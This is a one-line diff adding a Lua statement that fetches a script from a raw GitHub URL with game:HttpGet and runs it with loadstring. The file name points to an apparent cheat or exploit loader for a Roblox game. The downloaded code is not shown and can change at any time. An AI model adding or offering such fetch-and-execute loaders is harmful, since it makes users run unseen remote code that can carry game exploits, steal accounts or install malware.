@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/regretevator-elevator-simulator-spam0-nzdtmsc2h0s129.lua"))()
